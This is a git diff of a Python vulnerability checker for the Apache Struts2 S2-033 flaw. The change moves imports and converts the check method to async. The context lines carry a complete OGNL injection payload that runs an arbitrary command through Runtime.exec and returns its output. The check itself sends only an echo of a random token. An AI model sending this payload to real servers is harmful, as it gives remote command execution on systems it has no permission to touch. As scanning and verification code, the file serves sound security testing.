@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_033_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class S2_033_BaseVerify:
         }
         self.payload = '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command='''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -33,15 +33,12 @@ class S2_033_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
-            if self.capta in check_req.text and len(check_req.text) < 100:
+            check_req = await request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
+            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
         
 if  __name__ == "__main__":
